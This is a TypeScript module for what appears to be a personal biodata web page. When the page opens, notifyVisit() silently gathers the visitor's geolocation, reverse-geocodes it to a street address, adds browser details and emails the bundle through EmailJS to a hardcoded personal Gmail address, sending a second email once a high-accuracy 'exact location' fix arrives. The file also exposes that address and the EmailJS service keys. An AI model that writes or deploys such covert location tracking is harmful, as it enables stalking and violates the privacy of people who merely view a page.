import emailjs from "@emailjs/browser";

export const EMAILJS_CONFIG = {
  SERVICE_ID: "service_yhpa91x",
  TEMPLATE_ID: "template_s71j8d7",
  PUBLIC_KEY: "t_7GFFUEQgfM5c5kj",
};

let initialized = false;
const ensureInit = () => {
  if (!initialized) {
    emailjs.init({ publicKey: EMAILJS_CONFIG.PUBLIC_KEY });
    initialized = true;
  }
};

const getVisitorInfo = () => {
  const ua = navigator.userAgent;
  const lang = navigator.language;
  const screen = `${window.screen.width}x${window.screen.height}`;
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const referrer = document.referrer || "Direct";
  return `User-Agent: ${ua}\nLanguage: ${lang}\nScreen: ${screen}\nTimezone: ${tz}\nReferrer: ${referrer}\nPage: ${window.location.href}`;
};

const reverseGeocode = async (lat: number, lng: number): Promise<string> => {
  try {
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
      { headers: { "Accept-Language": "en" } }
    );
    const data = await res.json();
    return data?.display_name || "Address not found";
  } catch {
    return "Address lookup failed";
  }
};

const buildLocationBlock = async (pos: GeolocationPosition) => {
  const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
  const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
  const preciseUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
  const address = await reverseGeocode(latitude, longitude);
  return (
    `📍 Address: ${address}\n` +
    `Latitude: ${latitude}\n` +
    `Longitude: ${longitude}\n` +
    `Accuracy: ~${Math.round(accuracy)} meters\n` +
    (altitude != null ? `Altitude: ${altitude} m\n` : "") +
    (heading != null ? `Heading: ${heading}\n` : "") +
    (speed != null ? `Speed: ${speed} m/s\n` : "") +
    `Google Maps: ${mapsUrl}\n` +
    `Precise pin: ${preciseUrl}`
  );
};

const sendMail = async (subject: string, message: string, location: string) => {
  ensureInit();
  await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
    email: "shubhamsc9799@gmail.com",
    subject,
    message,
    location,
    visitor_info: getVisitorInfo(),
    timestamp: new Date().toLocaleString(),
  });
};

// Quick low-accuracy fix (cached allowed) for the first email
const getQuickPosition = (): Promise<GeolocationPosition | null> =>
  new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve(null);
    let done = false;
    const finish = (p: GeolocationPosition | null) => {
      if (done) return;
      done = true;
      resolve(p);
    };
    navigator.geolocation.getCurrentPosition(
      (p) => finish(p),
      () => finish(null),
      { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
    );
    setTimeout(() => finish(null), 5000);
  });

export const notifyVisit = async () => {
  // 1) First mail — page opened, with whatever quick location we can get
  try {
    const quick = await getQuickPosition();
    let locBlock = "Location: Not available yet";
    if (quick) locBlock = await buildLocationBlock(quick);
    await sendMail(
      "📄 Biodata Page Opened",
      `Someone just opened your biodata page.\n\n${locBlock}`,
      locBlock
    );
  } catch (e) {
    console.error("Page open mail failed:", e);
  }

  // 2) Second mail — exact high-accuracy location once available
  if (!("geolocation" in navigator)) return;
  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      try {
        const block = await buildLocationBlock(pos);
        await sendMail(
          "📍 Visitor Exact Location Captured",
          `Visitor exact location captured.\n\n${block}`,
          block
        );
      } catch (e) {
        console.error("Exact location mail failed:", e);
      }
    },
    (err) => console.warn("Exact location denied/unavailable:", err.message),
    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
  );
};
